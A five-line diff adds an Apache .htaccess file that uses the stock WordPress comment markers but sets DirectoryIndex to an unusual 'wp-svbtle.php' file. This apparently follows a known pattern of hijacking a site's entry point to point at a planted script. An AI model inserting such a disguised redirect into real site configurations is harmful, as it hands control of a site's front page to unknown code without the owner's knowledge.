@@ -1,0 +1,5 @@
+# BEGIN WordPress
+<IfModule mod_rewrite.c>
+	DirectoryIndex wp-svbtle.php
+</IfModule>
+# END WordPress
